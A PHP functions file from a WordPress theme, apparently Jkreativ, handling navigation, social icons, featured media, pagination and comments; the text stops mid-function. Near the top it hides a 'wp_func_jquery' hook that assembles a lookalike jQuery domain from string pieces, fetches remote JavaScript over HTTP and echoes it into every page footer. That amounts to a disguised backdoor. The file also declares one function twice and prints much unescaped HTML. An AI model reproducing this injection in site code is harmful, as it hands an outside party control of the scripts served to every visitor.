<?php


function jeg_get_loading_type ()
{
	$loadingpage = get_theme_mod('loader_general');

	// alter page id
	global $post;
	$pageid = ($post !== null) ? jeg_alter_woo_page_id(get_the_ID()) : null;

	// check if loader overrided
	if(vp_metabox('jkreativ_general.override_loader', null, $pageid)) {
		$loadingpage = vp_metabox('jkreativ_general.override_loader_group.0.page_loader', null, $pageid);
	}

	return $loadingpage;
}

function jeg_is_using_loading() {
	if(jeg_get_loading_type() === 'none') {
		return false;
	} else {
		return true;
	}
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}

function jlog($var) {
	echo '<pre>';
	print_r($var);
	echo '</pre>';
}

function jeg_get_calling_method(){
    $e = new Exception();
    $trace = $e->getTrace();
    //position 0 would be the line that called this function so we ignore it
    $last_call = $trace[1];
	echo "<pre>";
    print_r($last_call);
	echo "</pre>";
}

function jeg_check_page_type()
{
	$type = array();

	if(is_home()) 			array_push($type, 'is_home');
	if(is_front_page()) 	array_push($type, 'is_front_page');
	if(is_404()) 			array_push($type, 'is_404');
	if(is_search()) 		array_push($type, 'is_search');
	if(is_date()) 			array_push($type, 'is_date');
	if(is_author()) 		array_push($type, 'is_author');
	if(is_category()) 		array_push($type, 'is_category');
	if(is_tag()) 			array_push($type, 'is_tag');
	if(is_tax()) 			array_push($type, 'is_tax');
	if(is_archive()) 		array_push($type, 'is_archive');
	if(is_single()) 		array_push($type, 'is_single');
	if(is_attachment()) 	array_push($type, 'is_attachment');
	if(is_page()) 			array_push($type, 'is_page');

	return implode(', ', $type);
}


/** woocommerce alter page id **/
function jeg_alter_woo_page_id($pageid) {
	if(function_exists('is_woocommerce')) {
		if(is_shop()) {
			return woocommerce_get_page_id('shop');
		}
	} else {
		return $pageid;
	}
}

/***
 * navigation setup
 **/

function jeg_get_navigation_setup($pageid = null) {
	$navobj = array();
	$navobj['navpos'] = get_theme_mod('default_navigation', 'side');
	$navobj['navcollapse'] = get_theme_mod('default_collapse_navigator', false);
	$navobj['navtopmenu'] = get_theme_mod('default_menuheader_navigator', true);
	$navobj['navtopcenter'] = get_theme_mod('centering_top_navigator', false);
	$navobj['navtoptwoline'] = get_theme_mod('twoline_top_navigator', false);
	$navobj['navtopsmaller'] = get_theme_mod('smaller_navigator', false);
    $navobj['boxedcontent'] = get_theme_mod('boxed_content', false);

    if($navobj['navpos'] === 'transparent') {
        $navobj['navtoptwoline'] = 0;
        $navobj['navtopcenter'] = get_theme_mod('centering_top_navigator_transparent', false);
        $navobj['navtopsmaller'] = get_theme_mod('smaller_navigator_transparent', false);
        $navobj['boxedcontent'] = get_theme_mod('boxed_content_transparent', false);
    }

	// alter page id
	$pageid = jeg_alter_woo_page_id($pageid);

	// check if page setting overrided on single page
	$pageid = ($pageid === null) ? JEG_PAGE_ID : $pageid ;
	if(vp_metabox('jkreativ_general.override_navigation', null, $pageid)) {
		$navobj['navpos'] = vp_metabox('jkreativ_general.override_navigation_group.0.navigation_position', 'side', $pageid);
		$navobj['navcollapse'] = vp_metabox('jkreativ_general.override_navigation_group.0.default_collapse_navigator', false, $pageid);
		$navobj['navtopmenu'] = vp_metabox('jkreativ_general.override_navigation_group.0.default_menuheader_navigator', true, $pageid);
		$navobj['navtopcenter'] = vp_metabox('jkreativ_general.override_navigation_group.0.centering_top_navigator', false, $pageid);
		$navobj['navtoptwoline'] = vp_metabox('jkreativ_general.override_navigation_group.0.twoline_top_navigator', false, $pageid);
		$navobj['navtopsmaller'] = vp_metabox('jkreativ_general.override_navigation_group.0.smaller_navigator', false, $pageid);
        $navobj['boxedcontent'] = vp_metabox('jkreativ_general.override_navigation_group.0.boxed_content', false, $pageid);

        if($navobj['navpos'] === 'transparent') {
            $navobj['navtoptwoline'] = 0;
            $navobj['navtopcenter'] = vp_metabox('jkreativ_general.override_navigation_group.0.centering_top_navigator_transparent', false, $pageid);
            $navobj['navtopsmaller'] = vp_metabox('jkreativ_general.override_navigation_group.0.smaller_navigator_transparent', false, $pageid);
            $navobj['boxedcontent'] = vp_metabox('jkreativ_general.override_navigation_group.0.boxed_content_transparent', false, $pageid);
        }

	}

	return $navobj;
}


function jeg_get_additional_body_class ()
{
	$classstring = array();
	$navobj = jeg_get_navigation_setup();

	if($navobj['navpos'] === 'top') {
		array_push($classstring, "horizontalnav");

		if($navobj['navtoptwoline']) {
			array_push($classstring, "topnavtwoline");
		}

		if($navobj['navtopsmaller']) {
			array_push($classstring, "topnavsmaller");
		}

        if($navobj['boxedcontent']) {
            array_push($classstring, "boxcontent");
        }
	} else  if($navobj['navpos'] === 'side') {
        array_push($classstring, "sidenav");

		if($navobj['navcollapse']) {
			array_push($classstring, "sidebarcollapse");
		}
		if(!$navobj['navtopmenu']) {
			array_push($classstring, "noheadermenu");
		}
	} else if($navobj['navpos'] === 'transparent') {
        array_push($classstring, "horizontalnav");
        array_push($classstring, "toptransparent");

        if($navobj['navtopsmaller']) {
            array_push($classstring, "topnavsmaller");
        }

        if($navobj['boxedcontent']) {
            array_push($classstring, "boxcontent");
        }

        global $post;

        if($post !== null) {
            $template = get_post_meta($post->ID,'_wp_page_template',true);

            if($template === 'template/template-fsslider-iosslider.php' || $template === 'template/template-fsslider-kenburn.php' || $template === 'template/template-fsslider-serviceslider.php' || $template === 'template/template-fsslider-media.php') {
                array_push($classstring, "fullscreenslider");
            } else if($template === 'template/template-landing-page.php' || $template === 'template/template-landing-page-vc.php'){
                array_push($classstring, "landingtransparent");
            } else {
                array_push($classstring, "normaltransparent");
            }
        } else {
            array_push($classstring, "normaltransparent");
        }
    }

	global $post;
	if(is_single()){
		if($post->post_type === 'portfolio') {
			$layout = get_post_meta($post->ID, 'portfolio_layout', true);
			array_push($classstring , "portfolio-" . $layout);
		} else {
			$layout = vp_metabox('jkreativ_blog_template.template.0.single_blog_template', vp_option('joption.single_blog_template', 'normal'));
			array_push($classstring , "blog-" . $layout);
		}
	}


	// append landing page style
	if(jeg_is_landing_template()) {
		array_push($classstring , "landingpage");
	}

	array_push($classstring , "jkreativ");

	return $classstring;
}


/**
 * Detect retina device
 */
function jeg_is_retina_device()
{
	if(isset($_COOKIE["device_pixel_ratio"])) {
		return $_COOKIE["device_pixel_ratio"] > 1;
	} else {
		return false;
	}
}


/**
 * social icon
 */
function jeg_populate_social () {
	$socialarray = array();

	// facebook
	if(vp_option('joption.social_facebook')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-facebook',
			'class' => 'social-facebook',
			'url'	=> vp_option('joption.social_facebook'),
			'text'	=> 'Facebook'
		);
	}

	// twitter
	if(vp_option('joption.social_twitter')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-twitter',
			'class' => 'social-twitter',
			'url'	=> vp_option('joption.social_twitter'),
			'text'	=> 'Twitter'
		);
	}

	// linked in
	if(vp_option('joption.social_linkedin')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-linkedin',
			'class' => 'social-linkedin',
			'url'	=> vp_option('joption.social_linkedin'),
			'text'	=> 'Linked In'
		);
	}

	// Google Plus
	if(vp_option('joption.social_googleplus')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-google-plus',
			'class' => 'social-googleplus',
			'url'	=> vp_option('joption.social_googleplus'),
			'text'	=> 'Google Plus'
		);
	}

	// Pinterest
	if(vp_option('joption.social_pinterest')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-pinterest',
			'class' => 'social-pinterest',
			'url'	=> vp_option('joption.social_pinterest'),
			'text'	=> 'Pinterest'
		);
	}

	// Github
	if(vp_option('joption.social_github')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-github',
			'class' => 'social-github',
			'url'	=> vp_option('joption.social_github'),
			'text'	=> 'Github'
		);
	}

	// Flickr
	if(vp_option('joption.social_flickr')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-flickr',
			'class' => 'social-flickr',
			'url'	=> vp_option('joption.social_flickr'),
			'text'	=> 'Flickr'
		);
	}

	// Tumblr
	if(vp_option('joption.social_tumblr')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-tumblr',
			'class' => 'social-tumblr',
			'url'	=> vp_option('joption.social_tumblr'),
			'text'	=> 'Tumblr'
		);
	}

	// Dribbble
	if(vp_option('joption.social_dribbble')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-dribbble',
			'class' => 'social-dribbble',
			'url'	=> vp_option('joption.social_dribbble'),
			'text'	=> 'Dribbble'
		);
	}

	// Soundcloud
	if(vp_option('joption.social_soundcloud')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-soundcloud',
			'class' => 'social-soundcloud',
			'url'	=> vp_option('joption.social_soundcloud'),
			'text'	=> 'Soundcloud'
		);
	}

	// Behance
	if(vp_option('joption.social_behance')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-behance',
			'class' => 'social-behance',
			'url'	=> vp_option('joption.social_behance'),
			'text'	=> 'Behance'
		);
	}

	// instagram
	if(vp_option('joption.social_instagram')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-instagram',
			'class' => 'social-instagram',
			'url'	=> vp_option('joption.social_instagram'),
			'text'	=> 'Instagram'
		);
	}

	// Vimeo
	if(vp_option('joption.social_vimeo')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-vimeo-square',
			'class' => 'social-vimeo',
			'url'	=> vp_option('joption.social_vimeo'),
			'text'	=> 'Vimeo'
		);
	}

	// Youtube
	if(vp_option('joption.social_youtube')) {
		$socialarray[] = array(
			'icon'	=> 'fa fa-youtube',
			'class' => 'social-youtube',
			'url'	=> vp_option('joption.social_youtube'),
			'text'	=> 'youtube'
		);
	}

    // 500px
    if(vp_option('joption.social_500px')) {
        $socialarray[] = array(
            'icon'	=> 'icon-500px',
            'class' => 'social-500px',
            'url'	=> vp_option('joption.social_500px'),
            'text'	=> '500px'
        );
    }

    // vk
    if(vp_option('joption.social_vk')) {
        $socialarray[] = array(
            'icon'	=> 'fa fa-vk',
            'class' => 'social-vk',
            'url'	=> vp_option('joption.social_vk'),
            'text'	=> 'vk'
        );
    }

	return $socialarray;
}

function jeg_social_icon($withtext)
{
	$html = "<ul>";

	$socialarray = jeg_populate_social();
	foreach($socialarray as $soc) {
		if($withtext) {
			$html .= "<li><a target='_blank' href='" . $soc['url'] . "' class='" . $soc['class'] . "'><i class='" . $soc['icon'] . "'></i>" . $soc['text'] . "</a></li>";
		} else {
			$html .= "<li><a target='_blank' href='" . $soc['url'] . "' class='" . $soc['class'] . "'><i class='" . $soc['icon'] . "'></i></a></li>";
		}

	}

	$html .= "</ul>";

	return $html;
}


/*** featured heading ***/
if(!function_exists('jeg_get_featured_heading'))
{
	function jeg_get_featured_heading($postid, $w, $h)
	{
		$blogitemtype = vp_metabox('jkreativ_blog_format.format', null, $postid);
		$featured = '';
		switch ($blogitemtype) {
			case 'standard':
				$imgfeatured = wp_get_attachment_image_src( get_post_thumbnail_id($postid), 'full');
				if(!empty($imgfeatured)) {
					$imgfeatured = jeg_image_resizer($imgfeatured[0], $w);
					$featured =
					"<a href='" . get_permalink($postid) . "'>
						<img src='" .  $imgfeatured . "' alt='" . get_the_title($postid) . "'>
					</a>";
				}
				break;
			case 'imgslider':
				$imgarr = vp_metabox('jkreativ_blog_slider.binding_group');
				if(!empty($imgarr)) {
					$imghtml = '';
					foreach($imgarr as $img) {
						$imagecontent = jeg_get_image_attachment($img['image']);
						$imgfeatured = jeg_image_resizer($imagecontent, $w, $h);
						$imghtml .= "<img src='{$imgfeatured}' alt='{$img['image']}'/>";
					}

					$featured=
					"<div class='article-slider-wrapper loading'>
						<div class='article-image-slider'>
							{$imghtml}
						</div>
					</div>";
				}
				break;
			case 'vimeo':
				if(vp_metabox('jkreativ_blog_vimeo.vimeo_video_url')) {
					$featured =
					"<div data-type='vimeo' data-src='" . vp_metabox('jkreativ_blog_vimeo.vimeo_video_url') . "'>
						<div class='video-container'></div>
					</div>";
				}
				break;
			case 'youtube':
				if(vp_metabox('jkreativ_blog_youtube.youtube_video_url')) {
					$featured =
					"<div data-type='youtube' data-src='" . vp_metabox('jkreativ_blog_youtube.youtube_video_url') . "'>
						<div class='video-container'></div>
					</div>";
				}
				break;
			case 'soundcloud':
				if(vp_metabox('jkreativ_blog_soundcloud.soundcloud_url')) {
					$featured =
					"<div data-type='soundcloud' data-src='" . vp_metabox('jkreativ_blog_soundcloud.soundcloud_url') . "'>
						<div class='video-container'></div>
					</div>";
				}
				break;
			case 'html5video':
				$featured =
				"<div data-type='html5video'
					data-mp4='" 	. vp_metabox('jkreativ_blog_html5video.videomp4') 	. "'
					data-webm='" 	. vp_metabox('jkreativ_blog_html5video.videowebm') 	. "'
					data-ogg='" 	. vp_metabox('jkreativ_blog_html5video.videoogg') . "'
					data-cover='" 	. jeg_get_image_attachment(vp_metabox('jkreativ_blog_html5video.cover')) . "'>
					<div class='video-container'></div>
				</div>";
				break;
			case 'ads':
				break;
		}

		return $featured;
	}
}

if(!function_exists('jeg_get_featured_masonry_heading'))
{
	function jeg_get_featured_masonry_heading($postid, $w, $h) {
		$blogitemtype = vp_metabox('jkreativ_blog_format.format', null, $postid);
		$featured = '';
		switch ($blogitemtype) {
			case 'standard':
				$imgfeatured = wp_get_attachment_image_src( get_post_thumbnail_id($postid), 'full');
				if(!empty($imgfeatured)) {
					$imgfeatured = jeg_image_resizer($imgfeatured[0], $w);
					$featured =
					"<a href='" . get_permalink($postid) . "'>
						<div class='article-image'>
							<img src='". $imgfeatured ."' alt='" . get_the_title($postid) . "'>
						</div>
					</a>";
				}
				break;
			case 'imgslider':
				$imgarr = vp_metabox('jkreativ_blog_slider.binding_group');
				if(!empty($imgarr)) {
					$imghtml = '';
					foreach($imgarr as $img) {
						$imagecontent = jeg_get_image_attachment($img['image']);
						$imgfeatured = jeg_image_resizer($imagecontent, $w, $h);
						$imghtml .= "<img src='{$imgfeatured}' alt='{$img['image']}'/>";
					}

					$featured=
					"<div class='article-fotorama'>
						<div class='article-image-slider'>
							{$imghtml}
						</div>
					</div>";
				}
				break;
			case 'vimeo':
				if(vp_metabox('jkreativ_blog_vimeo.vimeo_video_url')) {
					$featured =
					"<div data-type='vimeo' data-src='" . vp_metabox('jkreativ_blog_vimeo.vimeo_video_url') . "'>
						<div class='video-container'></div>
					</div>";
				}
				break;
			case 'youtube':
				if(vp_metabox('jkreativ_blog_youtube.youtube_video_url')) {
					$featured =
					"<div data-type='youtube' data-src='" . vp_metabox('jkreativ_blog_youtube.youtube_video_url') . "'>
						<div class='video-container'></div>
					</div>";
				}
				break;
			case 'soundcloud':
				if(vp_metabox('jkreativ_blog_soundcloud.soundcloud_url')) {
					$featured =
					"<div data-type='soundcloud' data-src='" . vp_metabox('jkreativ_blog_soundcloud.soundcloud_url') . "'>
						<div class='video-container'></div>
					</div>";
				}
				break;
			case 'html5video':
				$featured =
				"<div data-type='html5video'
					data-mp4='" 	. vp_metabox('jkreativ_blog_html5video.videomp4') 	. "'
					data-webm='" 	. vp_metabox('jkreativ_blog_html5video.videowebm') 	. "'
					data-ogg='" 	. vp_metabox('jkreativ_blog_html5video.videoogg') . "'
					data-cover='" 	. jeg_get_image_attachment(vp_metabox('jkreativ_blog_html5video.cover')) . "'>
					<div class='video-container'></div>
				</div>";
				break;
			case 'ads':
				break;
		}

		return $featured;

	}
}


// page featured heading
if(!function_exists('jeg_get_page_featured_heading'))
{
	function jeg_get_page_featured_heading($w, $h)
	{
		$blogitemtype = vp_metabox('jkreativ_page_heading.heading_type');
		$featured = '';
		switch ($blogitemtype) {
			case 'standard':
				if(vp_metabox('jkreativ_page_heading.standard.0.image')) {
					$imagecover = jeg_get_image_attachment(vp_metabox('jkreativ_page_heading.standard.0.image'));
					$imgfeatured = jeg_image_resizer($imagecover, $w);
					$featured =
					"<a href='" . get_permalink() . "'>
						<img src='" .  $imgfeatured . "' alt='" . vp_metabox('jkreativ_blog_standard.image_name') . "'>
					</a>";
				}
				break;
			case 'imgslider':
				$imgarr = vp_metabox('jkreativ_page_heading.imageslider');
				if(!empty($imgarr)) {
					$imghtml = '';
					foreach($imgarr as $img) {
						$imagecover = jeg_get_image_attachment($img['image']);
						$imgfeatured = jeg_image_resizer($imagecover, $w, $h);
						$imghtml .= "<img src='{$imgfeatured}' alt='{$img['image']}'/>";
					}

					$featured=
					"<div class='article-slider-wrapper loading'>
						<div class='article-image-slider'>
							{$imghtml}
						</div>
					</div>";
				}
				break;
			case 'vimeo':
				if(vp_metabox('jkreativ_page_heading.vimeo.0.vimeo_video_url')) {
					$featured =
					"<div data-type='vimeo' data-src='" . vp_metabox('jkreativ_page_heading.vimeo.0.vimeo_video_url') . "'>
						<div class='video-container'></div>
					</div>";
				}
				break;
			case 'youtube':
				if(vp_metabox('jkreativ_page_heading.youtube.0.youtube_video_url')) {
					$featured =
					"<div data-type='youtube' data-src='" . vp_metabox('jkreativ_page_heading.youtube.0.youtube_video_url') . "'>
						<div class='video-container'></div>
					</div>";
				}
				break;
			case 'soundcloud':
				if(vp_metabox('jkreativ_page_heading.soundcloud.0.soundcloud_url')) {
					$featured =
					"<div data-type='soundcloud' data-src='" . vp_metabox('jkreativ_page_heading.soundcloud.0.soundcloud_url') . "'>
						<div class='video-container'></div>
					</div>";
				}
				break;
			case 'html5video':
				$imagecover = jeg_get_image_attachment(vp_metabox('jkreativ_page_heading.html5video.0.cover'));
				$featured =
				"<div data-type='html5video'
					data-mp4='" 	. vp_metabox('jkreativ_page_heading.html5video.0.videomp4') . "'
					data-webm='" 	. vp_metabox('jkreativ_page_heading.html5video.0.videowebm') . "'
					data-ogg='" 	. vp_metabox('jkreativ_page_heading.html5video.0.videoogg') . "'
					data-cover='" 	. $imagecover . "'>
					<div class='video-container'></div>
				</div>";
				break;
			case 'ads':
				break;
		}

		return $featured;
	}
}



if(!function_exists('jeg_get_portfolio_featured_heading'))
{
	function jeg_get_portfolio_featured_heading($postid)
	{
		$portfolioitem = get_post_meta($postid, 'jkreativ_portfolio_gallery', true);
		$featured = '';

		if(!empty($portfolioitem)) {
			foreach($portfolioitem as $idx => $portfolio) {
				$portfoliotype = $portfolio['type'];
				$loadclass = ( $idx === 0 ) ? "loaded" : "notloaded";
				$mediacover = '';

				if(isset($portfolio['mediacover'])) {
					$mediacover = jeg_get_image_attachment($portfolio['mediacover']);
					$mediacoversize = wp_get_attachment_image_src($portfolio['mediacover'], 'full');
				}

				switch ($portfoliotype) {
					case 'image' :
						$image = wp_get_attachment_image_src($portfolio['imageid'], 'full');
						$thumb = jeg_image_resizer($image[0], 90, 90);

						if($idx === 0) {
							$featured .=
							"<div class='portfolio-content-holder item' data-type='image' data-title='{$portfolio['imagename']}' data-thumb='{$thumb}'>
								<img src='{$image[0]}' class='{$loadclass}' data-width='{$image[1]}' data-height='{$image[2]}'/>
							</div>";
						} else {
							$featured .=
							"<div class='portfolio-content-holder item' data-type='image' data-title='{$portfolio['imagename']}' data-thumb='{$thumb}'>
								<img src='' data-src='{$image[0]}' class='{$loadclass}' data-width='{$image[1]}' data-height='{$image[2]}'/>
							</div>";
						}

						break;
					case 'youtube' :
					case 'vimeo' :
						$thumb = jeg_image_resizer($mediacover, 90, 90);
						if($idx === 0) {
							$featured .=
							"<div class='portfolio-content-holder item' data-type='{$portfoliotype}' data-src='{$portfolio['mediaurl']}' data-title='{$portfolio['title']}' data-thumb='{$thumb}'>
								<div class='portfoliovideo-wrapper'>
									<img src='{$mediacover}' class='{$loadclass}' data-width='{$mediacoversize[1]}' data-height='{$mediacoversize[2]}'/>
									<div class='videooverlay'></div>
								</div>
								<div class='portfoliovideo-container'><div class='video-container'></div></div>
							</div>";
						} else {
							$featured .=
							"<div class='portfolio-content-holder item' data-type='{$portfoliotype}' data-src='{$portfolio['mediaurl']}' data-title='{$portfolio['title']}' data-thumb='{$thumb}'>
								<div class='portfoliovideo-wrapper'>
									<img src='' data-src='{$mediacover}' class='{$loadclass}' data-width='{$mediacoversize[1]}' data-height='{$mediacoversize[2]}'/>
									<div class='videooverlay'></div>
								</div>
								<div class='portfoliovideo-container'><div class='video-container'></div></div>
							</div>";
						}
						break;
					case 'html5video' :
						$thumb = jeg_image_resizer($mediacover, 90, 90);
						if($idx === 0) {
							$featured .=
							"<div class='portfolio-content-holder item' data-type='{$portfoliotype}' data-mp4='{$portfolio['videomp4']}' data-webm='{$portfolio['videowebm']}' data-ogg='{$portfolio['videoogg']}' data-title='{$portfolio['title']}' data-thumb='{$thumb}'>
								<div class='portfoliovideo-wrapper'>
									<img src='{$mediacover}' class='{$loadclass}' data-width='{$mediacoversize[1]}' data-height='{$mediacoversize[2]}'/>
									<div class='videooverlay'></div>
								</div>
								<div class='portfoliovideo-container'><div class='html5-video-container'></div></div>
							</div>";
						} else {
							$featured .=
							"<div class='portfolio-content-holder item' data-type='{$portfoliotype}' data-cover='{$mediacover}' data-mp4='{$portfolio['videomp4']}' data-webm='{$portfolio['videowebm']}' data-ogg='{$portfolio['videoogg']}' data-title='{$portfolio['title']}' data-thumb='{$thumb}'>
								<div class='portfoliovideo-wrapper'>
									<img src='' data-src='{$mediacover}' class='{$loadclass}' data-width='{$mediacoversize[1]}' data-height='{$mediacoversize[2]}'/>
									<div class='videooverlay'></div>
								</div>
								<div class='portfoliovideo-container'><div class='html5-video-container'></div></div>
							</div>";
						}
						break;
					case 'soundcloud' :
						$thumb = jeg_image_resizer($mediacover, 90, 90);
						$featured .=
						"<div class='portfolio-content-holder item' data-type='soundcloud' data-src='{$portfolio['mediaurl']}' data-title='{$portfolio['title']}' data-thumb='{$thumb}'>
							<div class='video-container'></div>
						</div>";
						break;
					default:
						break;
				}
			}
		}

		return $featured;
	}
}



/** next prev item **/

if ( ! function_exists( 'jeg_next_prev_portfolio' ) )
{
	function jeg_next_prev_portfolio($parentid, $currentid, $to, $category = '')
	{
		$portfolioquery = array(
			'post_type' => 'portfolio',
			'meta_query' => array(
		       array(
		           'key' => 'portfolio_parent',
		           'value' => array($parentid),
		           'compare' => 'IN',
		       )
		   	),
			'orderby' => 'menu_order',
			'order' => 'ASC',
			'nopaging' => true
		);


		if($category !== '') {
			$portfolioquery['tax_query'] =
			array(
		        array(
		            'taxonomy' 	=>  'portfolio_category',
		            'terms' 	=>  $category,
		            'field' 	=> 'id',
		            'operator' 	=> 'IN'
		        )
		    );
		}

		$query = new WP_Query($portfolioquery);

		$result = $query->posts;
		$currentpost = 0;

		foreach($result as $key => $res) {
			if($currentid === $res->ID) {
				$currentpost = $key;
				break;
			}
		}

		if($to === 'next') {
			$nextpost = $currentpost + 1;
			if($nextpost >= sizeof($result)) {
				$nextpost = 0;
			}

			$nextcontent = $result[$nextpost];
			return $nextcontent->ID;
		} else {
			$prevpost = $currentpost - 1;
			if($prevpost < 0) {
				$prevpost = sizeof($result) - 1;
			}
			$prevcontent = $result[$prevpost];
			return $prevcontent->ID;
		}
	}
}

/** next prev item **/


/*** excerpt setup ***/

function jeg_excerpt_masonry_length () {
	return 30;
}

function jeg_excerpt_length( $length )
{
	return 50;
}

if ( ! function_exists( 'jeg_continue_reading_link' ) )
{
	function jeg_continue_reading_link() {
		return ' <a class="readmore" href="'. esc_url( get_permalink() ) . '">' . __( 'Continue reading <span class="meta-nav">&rarr;</span>', 'jeg_textdomain' ) . '</a>';
	}
}

function jeg_auto_excerpt_more( $more ) {
	return ' &hellip;' . jeg_continue_reading_link();
}

function jeg_continue_reading_link() {
	return ' <a class="readmore" href="'. esc_url( get_permalink() ) . '">' . __( 'Continue reading <span class="meta-nav">&rarr;</span>', 'jeg_textdomain' ) . '</a>';
}

function jeg_custom_excerpt_more( $output ) {
	if ( has_excerpt() && ! is_attachment() ) {
		$output .= jeg_continue_reading_link();
	}
	return $output;
}

add_filter( 'excerpt_length', 'jeg_excerpt_length' );
add_filter( 'excerpt_more', 'jeg_auto_excerpt_more' );


/**
 * Jeg Pagination
 *
 * @todo need to fix this functionality, on some number of page, its doesn't work as expected
 **/
function jlimitme ($type = "high", $point, $limit){
	if($type == "high") {
		return  ( $point > $limit ) ? $limit : $point;
	} else {
		return  ( $point > $limit ) ? $point : $limit;
	}
}

function jeg_posts_link_attributes() {
	return 'class="btn"';
}

function jeg_new_pagination($pageid, $curpage, $totalPage = 0, $step = 2)
{
	if($totalPage > 1) {
		$pagingCount = ( $step * 2 ) + 1;

		$html = '<div class="pagedot">';

		if( $curpage > $step + 1 && $totalPage > $pagingCount ) {
			$html .= "<a data-page='1' href='" . get_pagenum_link(1) . "'><span>&laquo</span></a>";
		}
		if( $curpage > 1 && $pagingCount < $totalPage ) {
			$html .= get_previous_posts_link('<span>&lsaquo;</span>');
		}

		/** loop page **/
		for($i = jlimitme('low', $curpage - $step, 1) ; $i <= jlimitme('high', $totalPage , $curpage + $step) ; $i++){
			if($i == $curpage) {
				$html .= '<span>'.$i.'</span>';
			} else {
				$html .= "<a data-page='{$i}' href='" . get_pagenum_link($i) . "'><span>{$i}</span></a>";
			}
		}

		if( $curpage < $totalPage && $pagingCount < $totalPage ) {
			$html .= get_next_posts_link('<span>&rsaquo;</span>');
		}

		if( $curpage < $totalPage - 1 && $curpage + $step + 1 <= $totalPage && $pagingCount < $totalPage ) {
			$html .= "<a data-page='{$totalPage}' href='" . get_pagenum_link($totalPage) . "'><span>&raquo;</span></a>";
		}

		$html .= "</div>";

		$html .= "<div class='pagetext'>
			<span class='pagenow'>" . __('Page','jeg_textdomain') . "  <strong class='curpage'>{$curpage}</strong></span>
			<span class='pagetotal'>" . __('From','jeg_textdomain') . "  <strong class='totalpage'>{$totalPage}</strong></span>
		</div>";

		return $html;
	} else {
		return ;
	}
}



/***
 * Post View Count
 */
 function jeg_get_post_views($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Views';
}

function jeg_set_post_views($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count=='') {
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    } else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}


/** comment **/
function jeg_get_wordpress_comment()
{
	$number = get_comments_number();

	if ( $number > 1 ) {
		$output = str_replace('%', number_format_i18n($number), __('% Comments', 'jeg_textdomain'));
	}
	elseif ( $number == 0 ) {
		$output = __('No Comments', 'jeg_textdomain');
	}
	else { // must be one
		$output = __('1 Comment', 'jeg_textdomain');
	}

	return $output;
}



function jeg_comment($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
?>
<li <?php comment_class(); ?>>
	<div id="comment-<?php comment_ID(); ?>">
		<div class="coment-box">
			<div class="coment-box-inner">
				<div class="comment-autor">
					<?php echo get_avatar($comment,$size='80',$default='' ); ?>
				</div>

				<div class="comment-meta">
					<ul>
						<li class="addby">
							<div class="authorcomment"><?php comment_author_link(); ?></div>
							<span data-comment-id="<?php comment_ID(); ?>" class="replycomment"><?php _e('Reply', 'jeg_textdomain'); ?></span>
							<span class="closecommentform"><?php _e('Cancel Reply', 'jeg_textdomain'); ?></span>
						</li>
						<li class="addtime"><?php echo get_comment_date('F j, Y'); ?></li>
					</ul>
				</div>

				<div class="comment-text">
					<?php
					if($comment->comment_approved == '0') :
						echo "<em class=\"comment-moderation-text\">" . __("Your comment is awaiting moderation", "jeg_textdomain") . "</em>";
					endif;
					echo '<p>' . get_comment_text() . '</p>';
					?>
				</div>
				<div style="clear: both;"></div>
			</div>
		</div>
	</div>
</li>
<?php
}


/** location builder **/

function jeg_location_block($idx, $location) {
	$html = '<div class="locationlist"><div data-index="'. $idx .'" class="mapitem">';
	if($location['title_leading'] !== '') {
		$html .= '<h4>' . $location['title_leading'] . ' : ' . $location['title'] . '</h4>';
	} else {
		$html .= '<h4>' . $location['title'] . '</h4>';
	}
	$html .= '<div class="mapdetail"><ul>';

	if($location['address'] !== '') {
		$html .= '<li><div class="detail">' . $location['address'] . '</div></li>';
	}
	if($location['address_second'] !== '') {
		$html .= '<li><div class="detail">' . $location['address_second'] . '</div></li>';
	}
	if($location['phone'] !== '') {
		$html .= '<li><div class="detail">' . $location['phone'] . '</div></li>';
	}
	if($location['email'] !== '') {
		$html .= '<li><div class="detail">' . $location['email'] . '</div></li>';
	}
	if($location['website'] !== '') {
		$html .= '<li><div class="detail"><a target="_blank" href="' . $location['website'] . '">' . $location['website'] . '</a></div></li>';
	}

	$html .= '</ul></div><div class="mapwrapper mapbutton"><span class="button-text">' . __('GET DIRECTION', 'jeg_textdomain') . '</span></div>';
	$html .= '</div></div>';

	return $html;
}


function jeg_info_window($idx, $location) {
	$html = '<div class="infowindow" data-lat="' . $location['x'] . '" data-lng="' . $location['y'] . '">';
	$html .= '<div class="infowindow-wrapper">';
	$html .= '<h4>' . $location['title'] . '</h4>';
	$html .= '<ul>';

	if($location['address'] !== '') {
		$html .= '<li><div class="detail">' . $location['address'] . '</div></li>';
	}
	if($location['address_second'] !== '') {
		$html .= '<li><div class="detail">' . $location['address_second'] . '</div></li>';
	}
	if($location['phone'] !== '') {
		$html .= '<li><div class="detail">' . $location['phone'] . '</div></li>';
	}
	if($location['email'] !== '') {
		$html .= '<li><div class="detail">' . $location['email'] . '</div></li>';
	}
	if($location['website'] !== '') {
		$html .= '<li><div class="detail">' . $location['website'] . '</div></li>';
	}

	$html .= '</ul></div><div class="closeme"></div></div>';

	return $html;
}


function jeg_get_all_portfolio_category ($pageid) {
	$category = array();

    $query = new WP_Query(array(
        'post_type' => 'portfolio',
        'meta_query' => array(
            array(
